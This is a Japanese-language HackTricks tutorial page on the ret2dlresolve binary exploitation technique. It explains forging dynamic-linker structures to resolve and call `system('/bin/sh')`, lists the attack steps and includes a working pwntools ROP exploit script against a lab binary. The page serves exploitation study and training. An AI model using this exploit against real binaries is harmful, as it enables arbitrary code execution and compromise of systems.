# Ret2dlresolve

{{#include ../../../banners/hacktricks-training.md}}

## 基本情報

[**GOT/PLT**](../arbitrary-write-2-exec/aw2exec-got-plt.md)および[**Relro**](../common-binary-protections-and-bypasses/relro.md)に関するページで説明されているように、Full Relroがないバイナリは、最初に使用されるときにシンボル（外部ライブラリへのアドレスなど）を解決します。この解決は、**`_dl_runtime_resolve`**関数を呼び出すことで行われます。

**`_dl_runtime_resolve`**関数は、指定されたシンボルを解決するために必要な構造体への参照をスタックから取得します。

したがって、要求されたシンボル（例えば、**`system`**関数）を動的にリンクして解決し、設定されたパラメータ（例：**`system('/bin/sh')`**）で呼び出すために、**これらの構造体をすべて偽造する**ことが可能です。

通常、これらの構造体は、書き込み可能なメモリ上で**`read`を呼び出す初期ROPチェーンを作成することによって偽造され**、その後、**構造体**と文字列**`'/bin/sh'`**が渡され、既知の場所に保存されます。そして、ROPチェーンは**`_dl_runtime_resolve`**を呼び出すことで続行され、`$'/bin/sh'`へのアドレスが渡されます。

> [!TIP]
> この技術は、特にシステムコールガジェットがない場合（[**ret2syscall**](rop-syscall-execv.md)や[SROP](srop-sigreturn-oriented-programming.md)などの技術を使用するため）や、libcアドレスを漏洩させる方法がない場合に便利です。

この技術に関するより良い説明は、ビデオの後半で見つけることができます：

{{#ref}}
https://youtu.be/ADULSwnQs-s?feature=shared
{{#endref}}

## 構造体

3つの構造体を偽造する必要があります：**`JMPREL`**、**`STRTAB`**、および**`SYMTAB`**。これらの構造体がどのように構築されるかについてのより良い説明は、[https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve#structures](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve#structures)で確認できます。

## 攻撃の概要

1. 偽の構造体をどこかに書き込む
2. systemの最初の引数を設定する（`$rdi = &'/bin/sh'`）
3. **`_dl_runtime_resolve`**を呼び出すために構造体へのアドレスをスタックに設定する
4. **`_dl_runtime_resolve`**を呼び出す
5. **`system`**が解決され、引数として`'/bin/sh'`で呼び出される

## 例

この技術の[**例はこちら**](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve/exploitation)で見つけることができ、**最終ROPチェーンの非常に良い説明が含まれています**が、ここに使用された最終的なエクスプロイトがあります：
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = elf.process()
rop = ROP(elf)

# create the dlresolve object
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

rop.raw('A' * 76)
rop.read(0, dlresolve.data_addr) # read to where we want to write the fake structures
rop.ret2dlresolve(dlresolve)     # call .plt and dl-resolve() with the correct, calculated reloc_offset

log.info(rop.dump())

p.sendline(rop.chain())
p.sendline(dlresolve.payload)    # now the read is called and we pass all the relevant structures in

p.interactive()
```
## 参考文献

- [https://youtu.be/ADULSwnQs-s](https://youtu.be/ADULSwnQs-s?feature=shared)
- [https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve)

{{#include ../../../banners/hacktricks-training.md}}
